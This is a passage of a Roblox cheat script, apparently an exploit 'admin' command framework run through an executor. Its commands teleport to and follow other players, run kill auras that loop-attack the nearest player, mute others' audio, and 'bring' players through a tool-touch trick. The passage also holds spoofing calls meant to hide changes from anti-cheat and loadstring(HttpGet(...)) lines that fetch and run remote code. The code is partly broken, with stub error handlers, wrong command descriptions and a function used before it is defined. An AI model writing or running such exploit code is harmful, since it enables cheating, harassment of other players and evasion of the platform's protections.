            BackgroundColor3 = Enabled and Color3fromRGB(255, 79, 87) or Color3fromRGB(25, 25, 25);
        });
        
        Callback(Enabled);
    end));
end

do
    local AmountPrint, AmountWarn, AmountError = 0, 0, 0;

    Utils.Warn = function(Text, Plr)
        local TimeOutputted = os.date("%X");
        local Clone = Clone(UI.MessageOut);
    
        Clone.Name = "W" .. tostring(AmountWarn + 1);
        Clone.Text = format("%s -- %s", TimeOutputted, Text);
        Clone.TextColor3 = Color3.fromRGB(255, 218, 68);
        Clone.Visible = true
        Clone.TextTransparency = 1
        Clone.Parent = Console.Frame.List
    
        Utils.Tween(Clone, "Sine", "Out", .25, {
            TextTransparency = 0
        })
    
        Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
        AmountWarn = AmountWarn + 1
        Utils.Notify(Plr, "Warning", Text);
    end
    
    Utils.Error = function(Text, Caller, FromNotif)
        local TimeOutputted = os.date("%X");
        local Clone = Clone(UI.MessageOut);
    
        Clone.Name = "E" .. tostring(AmountError + 1);
        Clone.Text = format("%s -- %s", TimeOutputted, Text);
        Clone.TextColor3 = Color3.fromRGB(215, 90, 74);
        Clone.Visible = true
        Clone.TextTransparency = 1
        Clone.Parent = Console.Frame.List
    
        Utils.Tween(Clone, "Sine", "Out", .25, {
            TextTransparency = 0
        })
    
        Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
        AmountError = AmountError + 1
    end
    
    Utils.Print = function(Text, Caller, FromNotif)
        local TimeOutputted = os.date("%X");
        local Clone = Clone(UI.MessageOut);
    
        Clone.Name = "P" .. tostring(AmountPrint + 1);
        Clone.Text = format("%s -- %s", TimeOutputted, Text);
        Clone.Visible = true
        Clone.TextTransparency = 1
        Clone.Parent = Console.Frame.List
    
        Utils.Tween(Clone, "Sine", "Out", .25, {
            TextTransparency = 0
        })
    
        Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
        AmountPrint = AmountPrint + 1
        if (len(Text) <= 35 and not FromNotif) then
            Utils.Notify(Caller, "Output", Text);
        end
    end
end
--END IMPORT [utils]



-- commands table
local CommandsTable = {}
local RespawnTimes = {}

local HasTool = function(plr)
    plr = plr or LocalPlayer
    local CharChildren, BackpackChildren = GetChildren(GetCharacter(plr)), GetChildren(plr.Backpack);
    local ToolFound = false
    local tbl = tbl_concat(CharChildren, BackpackChildren);
    for i = 1, #tbl do
        local v = tbl[i]
        if (IsA(v, "Tool")) then
            ToolFound = true
            break;
        end
    end
    return ToolFound
end

local isR6 = function(plr)
    plr = plr or LocalPlayer
    local Humanoid = GetHumanoid(plr);
    if (Humanoid) then
        return Humanoid.RigType == Enum.HumanoidRigType.R6
    end
    return false
end

local isSat = function(plr)
    plr = plr or LocalPlayer
    local Humanoid = GetHumanoid(plr)
    if (Humanoid) then
        return Humanoid.Sit
    end
end

local DisableAnimate = function()
    local Animate = GetCharacter().Animate
    Animate = IsA(Animate, "LocalScript") and Animate or nil
    if (Animate) then
        SpoofProperty(Animate, "Disabled");
        Animate.Disabled = true
    end
end

local GetCorrectToolWithHandle = function()
    local Tools = filter(tbl_concat(GetChildren(LocalPlayer.Backpack), GetChildren(LocalPlayer.Character)), function(i, Tool)
        local Correct = IsA(Tool, "Tool");
        if (Correct and (Tool.RequiresHandle or FindFirstChild(Tool, "Handle"))) then
            local Descendants = GetDescendants(Tool);
            for i = 1, #Descendants do
                local Descendant = Descendants[i]
                if (IsA(Descendant, "Sound") or IsA(Descendant, "Camera") or IsA(Descendant, "LocalScript")) then
                    Destroy(Descendant);
                end
            end
            return true
        end
        return false
    end)

    return Tools[1]
end

local CommandRequirements = {
    [1] = {
        Func = HasTool,
        Message = "You need a tool for this command"
    },
    [2] = {
        Func = isR6,
        Message = "You need to be R6 for this command"
    },
    [3] = {
        Func = function()
            return GetCharacter() ~= nil
        end,
        Message = "You need to be spawned for this command"
    }
}

local AddCommand = function(name, aliases, description, options, func, isplugin)
    local Cmd = {
        Name = name,
        Aliases = aliases,
        Description = description,
        Options = options,
        Function = function()
            for i, v in next, options do
                if (type(v) == 'function' and v() == false) then
                    Utils.Warn("You are missing something that is needed for this command", LocalPlayer);
                    return nil
                elseif (type(v) == 'number' and CommandRequirements[v].Func() == false) then
                    Utils.Warn(CommandRequirements[v].Message, LocalPlayer);
                    return nil
                end
            end
            return func
        end,
        ArgsNeeded = tonumber(filter(options, function(i,v)
            return type(v) == "string"
        end)[1]) or 0,
        Args = filter(options, function(i, v)
            return type(v) == "table"
        end)[1] or {},
        CmdEnv = {},
        IsPlugin = isplugin == true
    }

    CommandsTable[name] = Cmd
    if (type(aliases) == 'table') then
        for i, v in next, aliases do
            CommandsTable[v] = Cmd
        end
    end
    return Success
end

local RemoveCommand = function(Name)
    local Command = LoadCommand(Name);
    if (Command) then
        CommandsTable[Name] = nil
        local CommandsList = Commands.Frame.List
        local CommandLabel = FindFirstChild(CommandsList, Name);
        if (CommandLabel) then
            Destroy(CommandLabel);
        end
        return true
    end
    return false
end

local LoadCommand = function(Name)
    return rawget(CommandsTable, Name);
end

local PluginConf;
local ExecuteCommand = function(Name, Args, Caller)
    local Command = LoadCommand(Name);
    if (Command) then
        if (Command.ArgsNeeded > #Args) then
            return Utils.Warn(format("Insuficient Args (you need %d)", Command.ArgsNeeded), LocalPlayer);
        end

        local Context;
        local sett, gett = syn and syn_context_set or setidentity, syn and syn_context_get or getidentity
        if (Command.IsPlugin and sett and gett and PluginConf.SafePlugins) then
            Context = gett();
            sett(2);
        end
        local Success, Ret = xpcall(function()
            local Func = Command.Function();
            if (Func) then
                local Executed = Func(Caller, Args, Command.CmdEnv);
                if (Executed) then
                    Utils.Notify(Caller, "Command", Executed);
                end
                if (Command.Name ~= "lastcommand") then
                    if (#LastCommand == 3) then
                        LastCommand = shift(LastCommand);
                    end
                    LastCommand[#LastCommand + 1] = {Command.Name, Args, Caller, Command.CmdEnv}
                end
            end
            Success = true
        end, function(Err)
            if (Debug) then
a = true
            end
        end);
        if (Command.IsPlugin and sett and PluginConf.SafePlugins and Context) then
            sett(Context);
        end
    else
        Utils.Warn("couldn't find the command " .. Name, Caller);
    end
end

local ReplaceHumanoid = function(Hum, R)
    local Humanoid = Hum or GetHumanoid();
    local NewHumanoid = Clone(Humanoid);
    if (R) then
        NewHumanoid.Name = "1"
    end
    NewHumanoid.Parent = Humanoid.Parent
    NewHumanoid.Name = Humanoid.Name
    Services.Workspace.Camera.CameraSubject = NewHumanoid
    Destroy(Humanoid);
    SpoofInstance(NewHumanoid);
    return NewHumanoid
end

local ReplaceCharacter = function()
    local Char = LocalPlayer.Character
    local Model = InstanceNew("Model");
    LocalPlayer.Character = Model
    LocalPlayer.Character = Char
    Destroy(Model);
    return Char
end

local CFrameTool = function(tool, pos)
    local RightArm = FindFirstChild(GetCharacter(), "RightLowerArm") or FindFirstChild(GetCharacter(), "Right Arm");
    local Arm = RightArm.CFrame * CFrameNew(0, -1, 0, 1, 0, 0, 0, 0, 1, 0, -1, 0);
    local Frame = Inverse(toObjectSpace(Arm, pos));

    tool.Grip = Frame
end

_L.Sanitize = function(value)
    if typeof(value) == 'CFrame' then
        local components = {components(value)}
        for i,v in pairs(components) do
            components[i] = floor(v * 10000 + .5) / 10000
        end
        return 'CFrameNew('..concat(components, ', ')..')'
    end
end

local AddPlayerConnection = function(Player, Connection, CEnv)
    if (CEnv) then
        CEnv[#CEnv + 1] = Connection
    else
        Connections.Players[Player.Name].Connections[#Connections.Players[Player.Name].Connections + 1] = Connection
    end
    return Connection
end


local DisableAllCmdConnections = function(Cmd)
    local Command = LoadCommand(Cmd)
    if (Command and Command.CmdEnv) then
        for i, v in next, flat(Command.CmdEnv) do
            if (type(v) == 'userdata' and v.Disconnect) then
                Disconnect(v);
            end
        end
    end
    return Command
end

local Keys = {}

do
    local UserInputService = Services.UserInputService
    local IsKeyDown = UserInputService.IsKeyDown
    local WindowFocused = true
    AddConnection(CConnect(UserInputService.WindowFocusReleased, function()
        WindowFocused = false
    end));
    AddConnection(CConnect(UserInputService.WindowFocused, function()
        WindowFocused = true
    end));
    local GetFocusedTextBox = UserInputService.GetFocusedTextBox
    AddConnection(CConnect(UserInputService.InputBegan, function(Input, GameProcessed)
        Keys["GameProcessed"] = GameProcessed and WindowFocused and not (not GetFocusedTextBox(UserInputService));
        Keys["LastEntered"] = Input.KeyCode
        if (GameProcessed) then return end
        local KeyCode = split(tostring(Input.KeyCode), ".")[3]
        Keys[KeyCode] = true
        for i = 1, #Macros do
            local Macro = Macros[i]
            if (Tfind(Macro.Keys, Input.KeyCode)) then
                if (#Macro.Keys == 2) then
                    if (IsKeyDown(UserInputService, Macro.Keys[1]) and IsKeyDown(UserInputService, Macro.Keys[2]) --[[and Macro.Keys[1] == Input.KeyCode]]) then
                        ExecuteCommand(Macro.Command, Macro.Args);
                    end
                else
                    ExecuteCommand(Macro.Command, Macro.Args);
                end
            end
        end

        if (Input.KeyCode == Enum.KeyCode.F8) then
            if (Console.Visible) then
                local Tween = Utils.TweenAllTrans(Console, .25)
                CWait(Tween.Completed);
                Console.Visible = false
            else
                local MessageClone = Clone(Console.Frame.List);
    
                Utils.ClearAllObjects(Console.Frame.List)
                Console.Visible = true
            
                local Tween = Utils.TweenAllTransToObject(Console, .25, ConsoleTransparencyClone)
            
                Destroy(Console.Frame.List)
                MessageClone.Parent = Console.Frame
            
                for i, v in next, GetChildren(Console.Frame.List) do
                    if (not IsA(v, "UIListLayout")) then
                        Utils.Tween(v, "Sine", "Out", .25, {
                            TextTransparency = 0
                        })
                    end
                end
            
                local ConsoleListLayout = Console.Frame.List.UIListLayout
            
                CConnect(GetPropertyChangedSignal(ConsoleListLayout, "AbsoluteContentSize"), function()
                    local CanvasPosition = Console.Frame.List.CanvasPosition
                    local CanvasSize = Console.Frame.List.CanvasSize
                    local AbsoluteSize = Console.Frame.List.AbsoluteSize
            
                    if (CanvasSize.Y.Offset - AbsoluteSize.Y - CanvasPosition.Y < 20) then
                       wait();
                       Console.Frame.List.CanvasPosition = Vector2.new(0, CanvasSize.Y.Offset + 1000);
                    end
                end)
            
                Utils.Tween(Console.Frame.List, "Sine", "Out", .25, {
                    ScrollBarImageTransparency = 0
                })
            end
        end
    end));
    AddConnection(CConnect(UserInputService.InputEnded, function(Input, GameProcessed)
        if (GameProcessed) then return end
        local KeyCode = split(tostring(Input.KeyCode), ".")[3]
        if (Keys[KeyCode] or Keys[Input.KeyCode]) then
            Keys[KeyCode] = false
        end
    end));
end


AddCommand("view", {"v"}, "views a user", {3,"1"}, function(Caller, Args, CEnv)
    local Target = GetPlayer(Args[1]);
    if (#Target ~= 1) then
        Notify({ 
Description = "you can only view one person at a time";
Title = "w";
Duration = 2;
});
    end
    Target = Target[1]
    Camera.CameraSubject = GetCharacter(Target) or GetCharacter();
    AddConnection(CConnect(Target.CharacterAdded, function()
        CWait(Heartbeat);
        Camera.CameraSubject = Target.Character
    end), CEnv);
    AddConnection(CConnect(LocalPlayer.CharacterAdded, function()
        WaitForChild(LocalPlayer.Character, "Humanoid");
        CWait(Camera.CameraSubject.Changed);
        CWait(Heartbeat);
        Camera.CameraSubject = Target.Character
    end), CEnv);
    	        Notify({ 
Description = "viewing "..Target.Name;
Title = "viewing";
Duration = 2;
});
end)

AddCommand("unview", {"unv"}, "unviews a user", {3}, function(Caller, Args)
    DisableAllCmdConnections("view");
    Camera.CameraSubject = GetCharacter();
    	        Notify({ 
Description = "showing ur character";
Title = "unviewing";
Duration = 2;
});
end)

AddCommand("sit", {}, "makes you sit", {3}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
a = true
        else
	local Humanoid = GetHumanoid();
	SpoofProperty(Humanoid, "Sit", false);
	Humanoid.Sit = true
    	        Notify({ 
Description = "omg no way";
Title = "sitting";
Duration = 2;
});
end
end)




AddCommand("headstand", {"hstand"}, "stands on a players head", {"1",3}, function(Caller, Args, CEnv)
	local Target = GetPlayer(Args[1]);
	local Root = GetRoot();
	for i, v in next, Target do
		local Loop = CConnect(Heartbeat, function()
			Root.CFrame = v.Character.Head.CFrame * CFrameNew(0, 1, 0);
		end)
		CEnv[v.Name] = Loop
		AddPlayerConnection(v, Loop);
	end
end)

AddCommand("unheadstand", {"noheadstand"}, "unheadstands on the target", {3}, function(Caller, Args)
	local Looped = LoadCommand("headstand").CmdEnv
	for i, v in next, Looped do
		Disconnect(v);
	end
end)







AddCommand("antifling", {}, "freezes your character", {3}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
	local BaseParts = filter(GetChildren(GetCharacter(v)), function(i, v)
		return IsA(v, "BasePart");
	end)
	for i, v in next, BaseParts do
		SpoofProperty(v, "Anchored");
		v.Anchored = true
	end
end
end)

AddCommand("unantifling", {"thaw"}, "unfreezes your character", {3}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
	local BaseParts = filter(GetChildren(GetCharacter(v)), function(i, v)
		return IsA(v, "BasePart");
	end)
	for i, v in next, BaseParts do
		v.Anchored = false
	end
end
end)



AddCommand("semmemute", {}, "mutes a users boombox", {}, function(Caller, Args)
	Services.SoundService.RespectFilteringEnabled = false
	local Target = GetPlayer(Args[1]);
	for i, v in next, Target do
		for i2, v2 in next, GetDescendants(v.Character) do
			if (IsA(v2, "Sound")) then
				v2.Playing = false
			end
		end
	end
	Services.SoundService.RespectFilteringEnabled = true
end)

AddCommand("permmute", {"loopmute"}, "loop mutes a users boombox", {}, function(Caller, Args, CEnv)
	local Target = GetPlayer(Args[1]);
	local filterBoomboxes = function(i,v)
		return FindFirstChild(v, "Handle") and FindFirstChildWhichIsA(v.Handle, "Sound");
	end
	Services.SoundService.RespectFilteringEnabled = false
	local Con = AddConnection(CConnect(Heartbeat, function()
		for i, v in next, Target do
			for i2, v2 in next, GetDescendants(v.Backpack) do
				if (IsA(v2, "Sound")) then
					v2.Playing = false
				end
			end
			local Char = GetCharacter(v)
			if (Char) then
				for i22, v2 in next, GetDescendants(Char) do
					if (IsA(v2, "Sound")) then
						v2.Playing = false
					end
				end
			end
		end
	end));
	CEnv[Target] = Con
end)

AddCommand("unpermmute", {}, "unloopmutes a persons boombox", {"1"}, function(Caller, Args)
	local Target = GetPlayer(Args[1])
	local Muting = LoadCommand("loopmuteboombox").CmdEnv
	for i, v in next, Muting do
		for i2, v2 in next, Target do
			if (v2 == i) then
				Disconnect(v);
				Muting[i] = nil
			end
		end
	end
end)



AddCommand("audiolog", {}, "audio logs someone", {"1"}, function(Caller, Args)
	local Target = GetPlayer(Args[1]);
	for i, v in next, Target do
		for i2, v2 in next, GetDescendants(v.Character) do
			if (IsA(v2, "Sound") and IsA(v2.Parent.Parent, "Tool")) then
				local AudioId = split(v2.SoundId, "=")[2]
				setclipboard(AudioId);
			end
		end
	end
end)



local EspLib;
AddCommand("trace", {"locate"}, "traces a player", {"1"}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
a = true
        else
	if (not EspLib) then
		EspLib = loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/fatesc/fates-esp/main/esp-lib/esplibmain.lua"))();
	end
	local Target = GetPlayer(Args[1]);
	local New = EspLib.new
	for i, v in next, Target do
		New("Tracer", {
			Target = v
		});
		New("Text", {
			Target = v,
			ShowHealth = true,
			ShowDistance = true
		});
	end
	AddConnection(CConnect(Services.Players.PlayerRemoving, function(Plr)
		if (Tfind(Target, Plr)) then
			EspLib.Remove(v);
		end
	end), CEnv);
        Notify({ 
Description = format("now tracing %s", #Target == 1 and Target[1].Name or #Target .. " players");
Title = "tracing";
Duration = 2;
});
end
end)
AddCommand("untrace", {"unlocate"}, "untraces a player", {"1"}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
	if (not EspLib) then
		EspLib = loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/fatesc/fates-esp/main/esp-lib/esplibmain.lua"))();
	end
	local Target = GetPlayer(Args[1]);
	local Remove = EspLib.Remove
	for i, v in next, Target do
		Remove(v);
	end
	        Notify({ 
Description = format("now stopped tracing %s", #Target == 1 and Target[1].Name or #Target .. " players");
Title = "no longer tracing";
Duration = 2;
});
end
end)






AddCommand("refresh", {"re"}, "refreshes your character", {3}, function(Caller)
        if (Caller ~= LocalPlayer) then
a = true
        else
	for L_170_forvar0, L_171_forvar1 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
		if L_171_forvar1:IsA("BasePart") then
			L_171_forvar1:Destroy()
		end
	end
        Notify({ 
Description = "refreshed inot a new man ; ]";
Title = "refreshed";
Duration = 2;
});
end
end)

AddCommand("spin", {}, "spins your character (optional: speed)", {}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
a = true
        else
	local Speed = Args[1] or 30
	if (not CEnv[1]) then
		local Spin = InstanceNew("BodyAngularVelocity");
		ProtectInstance(Spin);
		Spin.Parent = GetRoot();
		Spin.MaxTorque = Vector3New(0, math.huge, 0);
		Spin.AngularVelocity = Vector3New(0, Speed, 0);
		CEnv[#CEnv + 1] = Spin
	else
		CEnv[1].AngularVelocity = Vector3New(0, Speed, 0);
	end
        Notify({ 
Description = "started spinning (if u couldnt tell)";
Title = "spin";
Duration = 2;
});
end
end)

AddCommand("unspin", {}, "unspins your character", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
	local Spinning = LoadCommand("spin").CmdEnv
	for i, v in next, Spinning do
		Destroy(v);
	end
	LoadCommand("spin").CmdEnv = {}
        Notify({ 
Description = "if you could tell ofc";
Title = "no longer spinning";
Duration = 2;
});
end
end)

AddCommand("goto", {"to"}, "teleports yourself to the other character", {3, "1"}, function(Caller, Args)
    local Target = GetPlayer(Args[1]);
    local Delay = tonumber(Args[2]);
    for i, v in next, Target do
        if (Delay) then
            wait(Delay);
        end
        if (Caller ~= LocalPlayer) then
a = true
        else
            GetRoot().CFrame = GetRoot(v).CFrame * CFrameNew(-5, 0, 0);
        end
    end
end)




AddCommand("abcthisisfordebugdontuse", {}, "DONT USE THIS COMMAND YOU WILL GET BANNED PROBALLY", {1}, function(Caller, Args)
    local Target = GetPlayer(Args[1]);
    local Target2 = Args[2] and GetPlayer(Args[2]);
    local OldPos = GetRoot(Caller).CFrame
    if (Caller ~= LocalPlayer and Target[1] == LocalPlayer) then
        GetRoot().CFrame = GetRoot(Caller).CFrame * CFrameNew(-5, 0, 0);
    else
        local TempRespawnTimes = {}
        for i = 1, #Target do
            local v = Target[i]
            TempRespawnTimes[v.Name] = RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name]
        end
        DisableAnimate();
        ReplaceHumanoid();
        for i, v in next, Target do
            if (#Target == 1 and TempRespawnTimes[v.Name] and isR6(v)) then
                Destroy(LocalPlayer.Character);
                CWait(LocalPlayer.CharacterAdded);
                WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos;
                wait(.1);
                ReplaceHumanoid();
            end
        end
        local Target2Root = Target2 and GetRoot(Target2 and Target2[1] or nil);
        for i = 1, #Target do
            local v = Target[i]
            if (GetCharacter(v)) then
                if (isSat(v)) then
                    if (#Target == 1) then
                        Utils.Notify(Caller or LocalPlayer, nil, v.Name .. " is sitting down, could not bring");
                    end
                    continue
                end
                if (RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name] and isR6(v)) then
                    continue
                end

                local TargetRoot = GetRoot(v);
                if (not TargetRoot) then
                    continue
                end

                local Tool = GetCorrectToolWithHandle();
                if (not Tool) then
                    continue
                end
                Tool.Parent = GetCharacter();
                Tool.Handle.Size = Vector3New(4, 4, 4);
                CFrameTool(Tool, (Target2 and Target2Root.CFrame or OldPos) * CFrameNew(-5, 0, 0));
                if (not syn) then
                    wait(.1);
                end
                for i2 = 1, 3 do
                    firetouchinterest(TargetRoot, Tool.Handle, 0);
                    wait();
                    firetouchinterest(TargetRoot, Tool.Handle, 1);
                end
            else
                Utils.Notify(Caller or LocalPlayer, "Fail", v.Name .. " is dead or does not have a root part, could not bring.");
            end
        end
        wait(.2);
        Destroy(LocalPlayer.Character);
        CWait(LocalPlayer.CharacterAdded);
        WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos
    end
end)

AddCommand("toggle", {"togglecommand", "togglecmd"}, "toggles a command with an 'un' command", {"1"}, function(Caller, Args, CEnv)
    local Command = Args[1]
    if (LoadCommand(Command)) then
        CEnv.Command = (CEnv.Command and CEnv.Command ~= true) and true or not CEnv.Command
        local NewArgs = shift(Args);
        if (CEnv.Command) then
            ExecuteCommand(Command, NewArgs, Caller);
        else
            ExecuteCommand("un" .. Command, NewArgs, Caller);
        end
    else
        return Command .. " is not a valid command"
    end
end)

















AddCommand("nokill", {}, "blocks user from being used in stuff like kill all", {"1"}, function(Caller, Args)
    local Target = GetPlayer(Args[1]);
    for i, v in next, Target do
        Exceptions[#Exceptions + 1] = v
    end
end)

AddCommand("noexception", {}, "removes user from exceptions list", {"1"}, function(Caller, Args)
    for i2, v2 in next, Exceptions do
        if (v2.Name == Args[1]) then
            v2 = nil
        end
    end
end)

AddCommand("clearexceptions", {}, "removes users from exceptions list", {}, function(Caller, Args)
    Exceptions = {}
end)


auraing2 = false
AddCommand("aura2", {"ka2"}, "enables chatlogs", {}, function(Caller)
auraing2 = true
standing2 = false


if standing == true then
ExecuteCommand("unstand", {}, LocalPlayer);
standing2 = true
end

repeat
wait()
ExecuteCommand("goto", {hostusername}, LocalPlayer);
ExecuteCommand("nokill", {hostusername}, LocalPlayer);

ExecuteCommand("goto", {"nearest"}, LocalPlayer);
	local localPlayer     = game:GetService("Players").LocalPlayer;
	local localCharacter  = localPlayer.Character;
				localCharacter.Combat:Activate()
ExecuteCommand("goto", {"nearest"}, LocalPlayer);
wait(0.1)
ExecuteCommand("goto", {"nearest"}, LocalPlayer);
wait(0.1)
ExecuteCommand("goto", {"nearest"}, LocalPlayer);
wait(0.1)
ExecuteCommand("goto", {"nearest"}, LocalPlayer);
wait(0.1)
ExecuteCommand("goto", {"nearest"}, LocalPlayer);
wait(0.1)
ExecuteCommand("goto", {"nearest"}, LocalPlayer);
wait(0.1)
ExecuteCommand("goto", {"nearest"}, LocalPlayer);
wait(0.1)
ExecuteCommand("goto", {"nearest"}, LocalPlayer);
wait(0.1)
ExecuteCommand("goto", {"nearest"}, LocalPlayer);
wait(0.1)
ExecuteCommand("goto", {"nearest"}, LocalPlayer);

ExecuteCommand("clearexceptions", {hostusername}, LocalPlayer);
ExecuteCommand("goto", {hostusername}, LocalPlayer);





until auraing2 == false


end)



AddCommand("unaura2", {"unka2"}, "enables chatlogs", {}, function(Caller)
auraing2 = false
ExecuteCommand("clearexceptions", {hostusername}, LocalPlayer);
wait(0.5)
ExecuteCommand("clearexceptions", {hostusername}, LocalPlayer);

if standing2 == true then
ExecuteCommand("summon", {}, LocalPlayer);
standing2 = false
end
end)




AddCommand("aura", {"ka"}, "enables chatlogs", {}, function(Caller)
auraing = true
Players = game:GetService("Players")

IYMouse = Players.LocalPlayer:GetMouse()
UserInputService = game:GetService("UserInputService")
releaseDelay = 0.2
				local mouse = IYMouse
repeat
wait()
	local localPlayer     = game:GetService("Players").LocalPlayer;
	local localCharacter  = localPlayer.Character;
				localCharacter.Combat:Activate()
until auraing == false
end)

AddCommand("unaura", {"unka"}, "enables chatlogs", {}, function(Caller)
auraing = false
end)


AddCommand("equipknife", {}, "enables chatlogs", {}, function(Caller)
			local Player = game:GetService("Players").LocalPlayer
			local Mouse = Player:GetMouse()
			local SpeedGlitch = false
			local Wallet = Player.Backpack:FindFirstChild("[Knife]")

					SpeedGlitch = not SpeedGlitch
					if SpeedGlitch == true then
						Wallet.Parent = Player.Character
						wait(0.15)
						Player.Character:FindFirstChild("Wallet").Parent = Player.Backpack
						wait(0.05)
						repeat game:GetService("RunService").Heartbeat:wait()
							SpeedGlitch = false
							game:GetService("RunService").Heartbeat:wait()
						until SpeedGlitch == false
						end
end)


AddCommand("equipfist", {}, "enables chatlogs", {}, function(Caller)
			local Player = game:GetService("Players").LocalPlayer
			local Mouse = Player:GetMouse()
			local SpeedGlitch = false
			local Wallet = Player.Backpack:FindFirstChild("Combat")

					SpeedGlitch = not SpeedGlitch
					if SpeedGlitch == true then
						Wallet.Parent = Player.Character
						wait(0.15)
						Player.Character:FindFirstChild("Wallet").Parent = Player.Backpack
						wait(0.05)
						repeat game:GetService("RunService").Heartbeat:wait()
							SpeedGlitch = false
							game:GetService("RunService").Heartbeat:wait()
						until SpeedGlitch == false
						end
end)

AddCommand("setup1", {"getknife"}, "enables chatlogs", {}, function(Caller)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-278, 22, -235)
   wait(0.2)
   local Players = game:GetService("Players")
local ContextActionService = game:GetService("ContextActionService")
 
local localPlayer = Players.LocalPlayer

			if localPlayer.Character then 
				local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")
				if humanoid then 
					humanoid:UnequipTools()
end
end
   
   local plr = game.Players.LocalPlayer
	local savedbatpos = plr.Character.HumanoidRootPart.Position
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(-278, 22, -235)
	wait(.4)

	fireclickdetector(game.Workspace.Ignored.Shop['[Knife] - $150'].ClickDetector)
	wait(0.1)
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(savedbatpos)
wait(0.3)

ExecuteCommand("equipknife", {}, LocalPlayer);
wait(0.1)
ExecuteCommand("reach", {}, LocalPlayer);
end)

AddCommand("circle", {"orb"}, "orbits a yourself around another player", {3, "1"}, function(Caller, Args, CEnv)

    local Target = GetPlayer(Args[1])[1];
    if (Target == LocalPlayer) then
a = true
    end
    local Radius = tonumber(Args[3]) or 5
    local Speed = tonumber(Args[2]) or 7
    local random = random(tick() / 2, tick());
    local Root, TRoot = GetRoot(), GetRoot(Target);
    AddConnection(CConnect(Heartbeat, function()
        Root.CFrame = CFrameNew(TRoot.Position + Vector3New(sin(tick() * Speed) * Radius, 0, cos(tick() * Speed) * Radius), TRoot.Position);
    end), CEnv);
end)


AddCommand("uncircle", {"orb"}, "unorbits yourself from the other player", {}, function()
    if (not next(LoadCommand("circle").CmdEnv)) then
a = true
    end
    DisableAllCmdConnections("circle");
end)



AddCommand("chat", {"say"}, "sends a message", {"1"}, function(Caller, Args)
    local ChatRemote = Services.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
    local toChat = concat(Args, " ");
    ChatRemote.FireServer(ChatRemote, toChat, "All");
    return "chatted " .. toChat
end)


attackinglol = false
positionlol = 1
AddCommand("position", {"pos"}, "sends a message", {}, function(Caller)
positionlol = positionlol+1
if positionlol == 1 then
_G.xpos = -3
end
if positionlol == 2 then
_G.xpos = 0
end

if positionlol == 3 then
_G.xpos = 3
positionlol = 0
end
end)

_G.xpos = 3
_G.ypos = 5
_G.zpos = 2


AddCommand("stand", {}, "loop teleports yourself to the other character", {3, "1"}, function(Caller, Args, CEnv)
   local Players = game:GetService("Players")
local ContextActionService = game:GetService("ContextActionService")
 
local localPlayer = Players.LocalPlayer

			if localPlayer.Character then 
				local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")
				if humanoid then 
					humanoid:UnequipTools()
end
end
ExecuteCommand("equipfist", {}, LocalPlayer);


ExecuteCommand("uncircle", {}, LocalPlayer);
if attackinglol == false then

	local Target = GetPlayer(Args[1])[1]
standuser = GetPlayer(Args[1])[1]
local standuser = GetPlayer(Args[1])[1]
wait(0.2)
if errored == false then
	undergroundtarget = GetPlayer(Args[1])[1]
	local Connection = CConnect(Heartbeat, function()
		GetRoot().CFrame = GetRoot(Target).CFrame * CFrameNew(_G.xpos, _G.ypos, _G.zpos);
	end)

	CEnv[Target.Name] = Connection
	AddPlayerConnection(LocalPlayer, Connection);
	AddConnection(Connection);
standing = true
ExecuteCommand("float", {}, LocalPlayer);
standing = true
end
end
end)



AddCommand("unstand", {}, "removes loop teleportation to the other character", {}, function(Caller)
attacking = false
            if attackunder == true then
                attackunder = false
                	local Looping = LoadCommand("underground").CmdEnv;
	if (not next(Looping)) then
	end
	DisableAllCmdConnections("stand");
		plr = game:GetService('Players').LocalPlayer
	X9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
		Y9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
		Z9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z

plr.Character.HumanoidRootPart.CFrame = CFrame.new(X99,Y99+6,Z99)
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X99,Y99+6,Z99)
                else
	local Looping = LoadCommand("stand").CmdEnv;
	if (not next(Looping)) then
	end
	DisableAllCmdConnections("stand");
	plr = game:GetService('Players').LocalPlayer
	X9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
		Y9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
		Z9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z

plr.Character.HumanoidRootPart.CFrame = CFrame.new(X9,Y9+26,Z9)
ExecuteCommand("unfloat", {}, LocalPlayer);
ExecuteCommand("away", {}, LocalPlayer);
standing = false
end
end)







standing = false
errored = false


AddCommand("attack", {"kill"}, "loop teleports yourself to the other character", {3, "1"}, function(Caller, Args, CEnv)
standing2 = false
wait(0.5)
if errored ~= true then
ExecuteCommand("float", {}, LocalPlayer);

if attackinglol == false then
flying = false
attackinglol = true
   local Players = game:GetService("Players")
local ContextActionService = game:GetService("ContextActionService")
 
local localPlayer = Players.LocalPlayer

			if localPlayer.Character then 
				local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")
				if humanoid then 
					humanoid:UnequipTools()
end
end
